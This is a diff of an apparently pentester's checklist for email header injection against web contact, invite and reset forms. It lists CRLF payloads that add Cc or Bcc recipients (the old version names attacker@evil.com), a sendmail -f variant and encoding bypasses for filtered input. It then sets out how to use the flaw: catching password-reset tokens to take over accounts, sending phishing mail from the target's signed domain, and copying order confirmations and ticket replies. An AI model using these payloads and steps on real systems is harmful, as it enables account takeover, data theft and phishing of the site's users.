@@ -1,29 +1,30 @@
-# Email Injection
+# Email injection
 
 ## Before I start
-- [ ] Contact/invite/reset form that sends mail; an inbox I control to catch results
+- [ ] A contact, invite or reset form that sends mail, and a mailbox of my own to catch the result
 
-## Core payloads
-email=victim@target%0ACc:attacker@evil.com
-email=victim@target%0D%0ABcc:attacker@evil.com
-email=victim@target%0A%0AAttacker body here
-email=-fattacker@evil.com
-- [ ] Inject into EVERY reflected field — Subject and Name are sanitized least
-- [ ] Success = my inbox receives the form's mail (or a BCC copy)
+## Payloads
+In the form's email field, with THE-ADDRESS its normal value and THE-MAILBOX my own address:
+THE-ADDRESS%0ACc:THE-MAILBOX
+THE-ADDRESS%0D%0ABcc:THE-MAILBOX
+THE-ADDRESS%0A%0ATHE-BODY
+-fTHE-MAILBOX
+- [ ] Every field that ends up in the mail tried, not only the address: the subject and the name are filtered least
+- [ ] It worked when the form's mail, or a blind copy of it, reaches my mailbox
 
-## Weaponize
-- [ ] BCC myself onto password-reset mail → token in my inbox = takeover
-- [ ] Phish from the target's own domain — their SPF/DKIM signs it
-- [ ] Exfil: BCC onto order confirmations / ticket replies
+## Use it
+- [ ] Myself as Bcc on a password reset mail: the token in my mailbox, and with it the account
+- [ ] Mail sent from the target's own domain, which its SPF and DKIM sign
+- [ ] Myself as Bcc on order confirmations or ticket replies
 
-## Validate
-- [ ] Compare delivered headers — injected fields appear verbatim
-- [ ] mail() 5th-param (-f) variant only when PHP/sendmail underneath
+## Confirm
+- [ ] The delivered headers compared: the injected fields are there as I sent them
+- [ ] The -f form, the fifth parameter of PHP's mail(), only with PHP and sendmail underneath
 
 ## If it fails
-- [ ] Framework rejects CRLF → URL-encoded, double-encoded, \n only, \r only
-- [ ] Nothing reflects into headers → bug absent; the form is just a form
+- [ ] CRLF rejected: URL-encoded, encoded twice, \n alone, \r alone
+- [ ] Nothing reaches the headers: no injection here
 
 ## Next
-- [ ] Working relay → phishing pretext against the client's users
-- [ ] Reset poisoning → account takeover → :Pb api
+- [ ] A working relay: a pretext for the client's users, :Pb phishing-payloads
+- [ ] A reset token caught: the account, then :Pb api
